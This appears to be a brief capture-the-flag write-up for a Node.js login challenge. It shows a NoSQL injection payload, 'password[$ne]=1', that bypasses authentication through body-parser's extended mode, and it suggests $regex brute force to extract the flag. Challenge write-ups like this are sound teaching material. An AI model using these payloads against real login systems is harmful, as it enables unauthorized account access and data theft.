1. With `bodyParser`'s `extended = true`, we can send object to nodejs. Use this to do NoSQL injection.

```
$ python3 solve.py
data> username=admin&password[$ne]=1
Success owo!
```

2. Use `$regex` to brute force out the flag.
